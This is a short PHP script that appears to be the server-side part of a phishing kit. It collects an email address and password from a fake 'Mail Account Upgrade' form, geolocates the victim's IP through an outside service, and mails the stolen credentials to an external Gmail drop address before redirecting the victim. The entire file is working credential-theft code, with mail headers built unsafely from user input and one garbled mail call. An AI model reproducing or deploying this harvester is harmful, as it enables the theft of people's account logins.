<?

$country = '';
$IP = $_SERVER['REMOTE_ADDR'];
if (!empty($IP)) {
$country = file_get_contents('http://api.hostip.info/country.php?ip='.$IP);
}

$ip = getenv("REMOTE_ADDR");
$do = "mail";
$message .= "-----UserID And Pass-----\n";
$message .= "UserID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .="Country : ".$country."\n";
$message .= "IP     : ".$ip."\n";
$message .= "--------------M.M.B.M---------------\n";
$send = "freshlogbox@gmail.com";
$subject = "Mail Account Upgrade";
$headers = "From:Created By MMBM<M.M.B.M@MMBM.COM>";
$headers .= $_POST['name']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send,);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
                $do($er,$subject,$message,$headers);
}
header("Location: Settings.html");
?>